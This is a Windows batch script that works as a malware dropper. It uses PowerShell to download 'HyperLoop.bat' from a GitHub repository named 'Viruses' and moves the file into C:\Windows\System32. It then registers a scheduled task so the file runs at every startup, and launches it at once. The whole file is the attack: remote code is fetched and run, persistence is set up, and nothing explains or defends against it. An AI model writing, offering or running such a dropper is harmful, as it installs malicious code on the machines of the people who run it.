@echo off
setlocal enabledelayedexpansion
set "url=https://raw.githubusercontent.com/INeddHelp/Viruses/master/HyperLoop/HyperLoop.bat"
set "file=%temp%\HyperLoop.bat"
powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%file%')"
move /y %file% "C:\Windows\System32\HyperLoop.bat"
schtasks /create /tn "HyperLoop Task" /tr "C:\Windows\System32\HyperLoop.bat" /sc onstart
start "C:\Windows\System32\HyperLoop.bat"
endlocal